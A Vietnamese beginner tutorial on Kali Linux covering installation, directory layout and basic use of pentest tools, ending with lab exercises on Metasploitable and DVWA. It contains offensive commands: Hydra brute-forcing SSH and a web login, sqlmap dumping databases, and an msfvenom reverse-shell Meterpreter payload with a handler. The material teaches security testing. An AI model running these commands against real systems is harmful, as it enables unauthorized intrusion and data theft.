# Nền Tảng Kali Linux

## Kali Linux là gì?

Kali Linux là hệ điều hành chuyên dụng cho **an ninh mạng**, được phát triển bởi Offensive Security (nay là OffSec), dựa trên nền tảng **Debian**. Kali chứa sẵn **600+ công cụ pentest** phục vụ cho: reconnaissance, scanning, exploitation, post-exploitation, digital forensics, và nhiều lĩnh vực khác.

![Kali Linux](https://www.kali.org/images/kali-logo.svg)

> **Mô tả:** Logo Kali Linux – hệ điều hành tiêu chuẩn của các pentester.

---

## Kali được dùng để làm gì?

| Lĩnh vực | Công cụ tiêu biểu |
|----------|-------------------|
| Information Gathering | `nmap`, `theHarvester`, `maltego` |
| Vulnerability Analysis | `nikto`, `openvas` |
| Web Application | `burpsuite`, `sqlmap`, `ffuf` |
| Password Attacks | `hashcat`, `john`, `hydra` |
| Wireless Attacks | `aircrack-ng`, `wifite` |
| Exploitation | `metasploit`, `msfvenom` |
| Post Exploitation | `mimikatz`, `powershell-empire` |
| Forensics | `autopsy`, `volatility`, `binwalk` |

![Kali desktop](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRS8VmnLDY6Pi_RWSd6KJCW0-CY_ig98uAVWFt_92stAw&s)


---

## Cài đặt Kali

### Yêu cầu tối thiểu

| Thành phần | Yêu cầu |
|------------|---------|
| RAM | 2GB (khuyến nghị 4GB) |
| Disk | 20GB |
| CPU | 2 core trở lên |

### Các cách cài đặt

1. **Cài trực tiếp (Bare Metal)** – cho máy thật
2. **Virtual Machine** – khuyến nghị cho người mới (VMware / VirtualBox)
3. **WSL** – chạy trong Windows
4. **Live USB / USB Persistence** – chạy không cần cài đặt
5. **Docker** – `docker run -it kalilinux/kali-rolling /bin/bash`

```bash
# Cài vào Docker
docker run -t -i kalilinux/kali-rolling /bin/bash
apt update && apt install -y kali-linux-headless
```

---

## Cấu trúc Kali

### Terminal & Root

- Kali mặc định dùng **root** user (hoặc user thường + `sudo`).
- Terminal là trung tâm mọi thao tác.

```bash
sudo su          # Chuyển sang root
whoami           # Xem user hiện tại
id               # UID, GID, groups
```

### Cấu trúc thư mục quan trọng

| Đường dẫn | Mục đích |
|-----------|----------|
| `/usr/share/wordlists` | Wordlist (rockyou.txt, ...) |
| `/etc` | Cấu hình hệ thống |
| `/var/log` | Log hệ thống |
| `/root` | Home của root |
| `/opt` | Tool cài tay |

```bash
ls -la /usr/share/wordlists
# rockyou.txt bị nén -> giải nén:
gunzip /usr/share/wordlists/rockyou.txt.gz
```

> **Wordlist:** Ngoài `rockyou.txt`, bạn cần thêm **SecLists** (bộ wordlist đầy đủ nhất). Cài nhanh trên Kali: `sudo apt install -y seclists`, hoặc tải từ GitHub: `https://github.com/danielmiessler/SecLists`.

---

## Khởi động Kali & Lệnh cần biết

```bash
# Cập nhật & nâng cấp hệ thống
sudo apt update
sudo apt upgrade -y

# Cài thêm công cụ
sudo apt install <tool> -y

# Tìm tool đã cài
which nmap
whereis hydra

# Xem tiến trình
ps aux
top
```

---

## Công cụ "bộ ba" khởi đầu

### 1. Nmap – Scan mạng

```bash
nmap -sV -sC -O target_ip
# -sV: phiên bản dịch vụ, -sC: default script, -O: detect OS
```

### 2. Burp Suite – Web proxy

- Dùng để bắt, sửa, lặp lại HTTP request.
- Tab **Proxy > Intercept** để chặn request.
- Tab **Repeater** để sửa và gửi lại.

### 3. Metasploit – Exploitation framework

```bash
msfconsole
search <vulnerability>
use <module>
set RHOSTS <target>
run
```

---

## Password Attacks cơ bản

### John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

### Hashcat

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# -m 0: MD5, -a 0: dictionary attack
```

### Hydra – brute force login

```bash
hydra -l admin -P passwords.txt ssh://target_ip
hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
```

---

## Web Application tools

### SQLMap

```bash
sqlmap -u "http://target/index.php?id=1" --dbs
sqlmap -u "http://target/index.php?id=1" -D <db> --tables
sqlmap -u "http://target/index.php?id=1" -D <db> -T <table> --dump
```

### FFUF – directory fuzzing

```bash
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302
```

### Gobuster

```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
gobuster vhost -u http://target -w vhosts.txt
```

---

## Làm việc với Metasploit

```bash
msfconsole -q

# Tạo payload với msfvenom
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf

# Trong msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit -j
```

---

## Mẹo làm việc với Kali

1. **Snapshot VM** trước khi làm lab – luôn có điểm khôi phục.
2. Dùng **tmux** để giữ phiên SSH khi ngắt kết nối.
3. Lưu note bằng **CherryTree** hoặc **Obsidian**.
4. Cập nhật tool thường xuyên: `sudo apt update && sudo apt upgrade`.
5. Không dùng Kali làm hệ điều hành hằng ngày – nó chỉ để pentest.
6. Dùng **Wireshark** để hiểu gói tin thay vì chỉ chạy tool mù.

```bash
# Cài thêm tool hữu ích
sudo apt install -y tmux cherrytree seclists gobuster ffuf
```

---

## Bài tập thực hành

1. Cài Kali trong VM (VirtualBox/VMware), tạo snapshot.
2. `sudo apt update && sudo apt upgrade`.
3. Giải nén `rockyou.txt` và đếm số dòng.
4. Scan máy lab (Metasploitable / DVWA) bằng `nmap -sV -sC`.
5. Dùng `hydra` brute force SSH login của một máy ảo bạn tự cài.
6. Dùng `sqlmap` dump một database trong DVWA.

---

> **Mẹo:** Đừng chạy tool mù. Hiểu đầu vào/đầu ra, kiểm tra kết quả thủ công. Hacker giỏi là người hiểu từng dòng output của công cụ.
